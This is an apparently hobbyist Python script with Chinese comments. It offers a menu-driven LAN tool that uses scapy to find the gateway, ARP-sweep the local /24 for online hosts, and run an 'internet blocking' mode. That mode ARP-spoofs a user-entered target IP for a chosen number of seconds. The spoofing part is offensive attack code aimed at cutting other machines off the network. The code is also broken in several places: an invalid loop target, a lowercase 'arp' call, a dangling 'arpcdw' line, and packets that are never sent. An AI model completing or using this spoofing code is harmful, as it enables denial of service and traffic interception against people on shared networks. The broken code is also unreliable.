import os,sys,time
from threading import Thread
# 第三方模块scapy
from scapy.all import *
wf = ''#网关
netcard = '网卡'#网卡


def scanHostTool():
    global wf
    global netcard
    print("开始使用内网扫描，请稍后")
    #route print查看列表
    netcard = "Realtek PCIe GBE Family Controller"
    #内网扫描
    for line in os.popen('route print'):
        #print(line)
        lines = line.strip()
        if lines.startswith("0.0.0.0"):
            ips=lines.split()
            # print(ips)
            wf=ips[2]
            ip=ips[3]
            print("*"*50)
            print(" 上网网关是：【",wf,"】")
            print(" 主机上网ip是:【",ip,"】")
            print(" 主机上网网卡是:【",netcard,"】")
            print("*"*50)

            #ARP嗅探在线主机
            arppackage=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=wf+"/24")#
            onlinepc,unonlinepc = srp(arppackage,iface=netcard,timeout=5,verbose=0)
            print("在线主机有{}台，不在线主机有{}台".format(len(onlinepc),len(unonlinepc)))
            for sip.smac in onlinepc:
                print("*** ",smac.psrc,"->",smac.hwsrc)

            print("*"*50)
            break

def spoofByArp():
    if wf=="":
        print("请先内扫后再使用攻击，原因是没有获得网关数据")
    else:
        vip = input("攻击目标与ip:")
        vtm = input("攻击目标的时常(s):")
        #判断输入信息的有效新
        if(vip==''):
            print("请输入攻击目标ip")
            return
        if(vtm==''):
            print("请输入攻击时常")
            return
        for i in range(int(vtm)):
            arpcup =Ether(dst='ff:ff:ff:ff:ff:ff')/arp(pdst=vip,psrc=wf)
            arpcdw
            time.sleep(0.2)

           
           


            

#菜单
def menu():
    print("logo")
    menuText ='''
[1]内网扫描工具
[2]内网阻网工具
[3]上网行为检测
[4]内网抓包工具
[q]退出工具
'''
    #print(menuText)
    while True:
        print(menuText)
        inputM=input("rex>>>")
        #print(inputM)
        if inputM =='1':
            print("欢迎使用内网扫描工具，请按提示运行")
            scanHostTool()
        elif inputM=='2':
            print("欢迎使用内网阻网工具，请按提示运行")
            spoofByArp()
        elif inputM.lower()=='q':
            sys.exit()
        else:
            print('请选择正确的菜单')
            
if __name__ == '__main__':
    menu()
